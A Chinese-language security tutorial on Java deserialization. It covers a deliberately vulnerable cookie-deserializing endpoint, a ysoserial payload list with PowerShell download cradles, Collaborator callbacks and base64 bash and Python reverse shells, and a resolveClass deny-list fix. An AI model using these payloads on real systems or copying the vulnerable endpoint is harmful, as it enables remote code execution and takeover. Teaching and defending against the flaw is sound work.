

# 一、漏洞原理

Serialization(序列化)：将java对象以一连串的字节保存在磁盘文件中的过程，也可以说是保存java对象状态的过程

deserialization(反序列化)：将保存在磁盘文件中的java字节码重新转换成java对象称为反序列化

Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期 的对象，在此过程中执行构造的任意代码。-
漏洞代码示例

    ......
    //读取输入流,并转换对象
    InputStream in=request.getInputStream();
    ObjectInputStream ois = new ObjectInputStream(in);
    //恢复对象
    ois.readObject();
    ois.close();
    

    Java程序使用ObjectInputStream对象的readObject方法将反序 列化数据转换为java对象。但当输入的反序列化的数据可被用户控 制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的 对象，在此过程中执行构造的任意代码。
    

核心代码：

    /**
     * java -jar ysoserial.jar CommonsCollections5 "open -a Calculator" | base64
     * Add the result to rememberMe cookie.
     * <p>
     * http://localhost:8080/deserialize/rememberMe/vuln
     */
    @RequestMapping("/rememberMe/vuln")
    public String rememberMeVul(HttpServletRequest request)
            throws IOException, ClassNotFoundException {
    
        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);
    
        if (null == cookie) {
            return "No rememberMe cookie. Right?";
        }
    
        String rememberMe = cookie.getValue();
        byte[] decoded = Base64.getDecoder().decode(rememberMe);
    
        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
        ObjectInputStream in = new ObjectInputStream(bytes);
        in.readObject();
        in.close();
    
        return "Are u ok?";
    }
    

    代码相对来说也比较简单使用Java程序中类ObjectInputStream的 readObject方法被用来将数据流反序列化为对象，如果流中的对象 是class，则它的ObjectStreamClass描述符会被读取，并返回相应 的class对象，ObjectStreamClass包含了类的名称及 serialVersionUID。 
    

# 二、利用方式

使用ysoserial.jar生成payload

    java -jar ysoserial.jar CommonsCollections5 "cmd /c calc" | base64 -w0  
     
     rememberMe=rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMam...
    

访问页面 [http://127.0.0.1:8080/deserialize/rememberMe/vuln](http://127.0.0.1:8080/deserialize/rememberMe/vuln)-
(ysoserial.jar是java反序列化工具 集，下载地址：https://github.com/angelwhu/ysoserial)-
ysoserial使用poc文档-
[https://book.hacktricks.xyz/pentesting-web/deserialization#java-http](https://book.hacktricks.xyz/pentesting-web/deserialization#java-http)

    # PoC to make the application perform a DNS req
    java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload
    
    # PoC RCE in Windows
    # Ping
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
    # Time, I noticed the response too longer when this was used
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
    # Create File
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
    # DNS request
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
    # HTTP request (+DNS)
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
    ## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
    ## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
    # Reverse Shell
    ## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"
    
    #PoC RCE in Linux
    # Ping
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload 
    # Time
    ## Using time in bash I didn't notice any difference in the timing of the response
    # Create file
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
    # DNS request
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
    # HTTP request (+DNS)
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
    # Reverse shell
    ## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
    ## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"
    
    # Base64 encode payload in base64
    base64 -w0 payload
    

# 三、修复方式

修复方式是通过Hook resolveClass来校验反序列化的类

> 序列化数据结构可以了解到包含了类的名称及serialVersionUID 的ObjectStreamClass描述符在序列化对象流的前面位置，且在 readObject反序列化时首先会调用resolveClass读取反序列化的 类名，所以这里通过重写ObjectInputStream对象的 resolveClass方法即可实现对反序列化类的校验。这个方法最早 是由IBM的研究人员Pierre Ernst在2013年提出《Look-ahead Java deserialization》

## 修复代码

    /**
     * Check deserialize class using black list.
     * <p>
     * http://localhost:8080/deserialize/rememberMe/security
     */
    @RequestMapping("/rememberMe/security")
    public String rememberMeBlackClassCheck(HttpServletRequest request)
            throws IOException, ClassNotFoundException {
    
        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);
    
        if (null == cookie) {
            return "No rememberMe cookie. Right?";
        }
        String rememberMe = cookie.getValue();
        byte[] decoded = Base64.getDecoder().decode(rememberMe);
    
        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
    
        try {
            AntObjectInputStream in = new AntObjectInputStream(bytes);  // throw InvalidClassException
            in.readObject();
            in.close();
        } catch (InvalidClassException e) {
            logger.info(e.toString());
            return e.toString();
        }
    
        return "I'm very OK.";
    }
    

## 跟入后对应代码

    /**
     * 只允许反序列化SerialObject class
     *
     * 在应用上使用黑白名单校验方案比较局限，因为只有使用自己定义的AntObjectInputStream类，进行反序列化才能进行校验。
     * 类似fastjson通用类的反序列化就不能校验。
     * 但是RASP是通过HOOK java/io/ObjectInputStream类的resolveClass方法，全局的检测白名单。
     *
     */
    @Override
    protected Class<?> resolveClass(final ObjectStreamClass desc)
            throws IOException, ClassNotFoundException
    {
        String className = desc.getName();
    
        // Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject
        logger.info("Deserialize class name: " + className);
    
        String[] denyClasses = {"java.net.InetAddress",
                                "org.apache.commons.collections.Transformer",
                                "org.apache.commons.collections.functors"};
    
        for (String denyClass : denyClasses) {
            if (className.startsWith(denyClass)) {
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
            }
        }
    
        return super.resolveClass(desc);
    }